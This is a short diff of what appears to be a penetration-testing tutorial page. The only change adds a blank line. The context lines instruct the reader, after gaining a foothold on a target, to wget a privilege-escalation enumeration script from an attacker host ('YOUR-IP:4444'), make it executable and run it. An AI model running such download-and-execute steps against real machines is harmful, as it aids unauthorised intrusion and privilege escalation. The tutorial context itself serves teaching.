@@ -16,6 +16,7 @@ Once you have get a initial foothold on a target machine than you can transfer t
 <code>wget http://YOUR-IP:4444/linprivcheck.sh  </code></br>
 
 <code>chmod +x linprivcheck.sh </code></br>
+
 <code>./linprivcheck.sh</code></br>
 
 This tool will save your lots of time inenumeration of machine and gives result in a good format.
